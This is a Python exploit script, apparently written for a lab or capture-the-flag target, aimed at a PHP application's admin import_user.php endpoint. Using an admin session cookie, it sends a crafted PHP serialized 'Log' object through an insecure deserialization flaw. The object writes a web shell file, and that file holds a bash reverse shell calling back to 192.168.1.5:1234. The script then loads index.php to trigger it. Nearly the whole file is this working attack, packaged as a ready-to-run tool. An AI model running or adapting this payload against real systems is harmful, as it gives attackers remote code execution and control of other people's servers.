import requests
from urllib.parse import urljoin
import traceback
import argparse

def importUser(target, session):

    url =  urljoin(target, "/admin/import_user.php")
    cookies = {"PHPSESSID": session}
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    data = {"userobj": "O:3:\"Log\":2:{s:1:\"f\";s:21:\"/var/www/html/rce.php\";s:1:\"m\";s:51:\"bash -c \"bash -i >& /dev/tcp/192.168.1.5/1234 0>&1\"\";}"}
    try:
        print("[*] Sending the request...")
        requests.post(url, headers=headers, cookies=cookies, data=data, allow_redirects=False)
        print("[+] Request sent")
        print("[*] Triggerring the RCE...")
        homePage = urljoin(target, "/index.php")
        try:
            print("[+] Check your listener!")
            requests.get(homePage, cookies=cookies)
        except Exception as e:
            print("[-] Failed to trigger the RCE: ", e)
            traceback.print_exc()
    except Exception as e:
        print("[-] Error sending the request: ", e)
        traceback.print_exc()

def main():
    parser = argparse.ArgumentParser(description="Upload webshell to the target machine")
    parser.add_argument("target", help="Target URL (e.g, http://localhost:8080)")
    parser.add_argument("session", help="Valid admin account session token")
    args = parser.parse_args()

    importUser(args.target, args.session)

    # Example Usage:
    # python3 importUser_insecure_deserialization.py http://localhost:8080 gnd8fkg0vadqu08nlsb603c306 

if __name__ == "__main__":
    main()
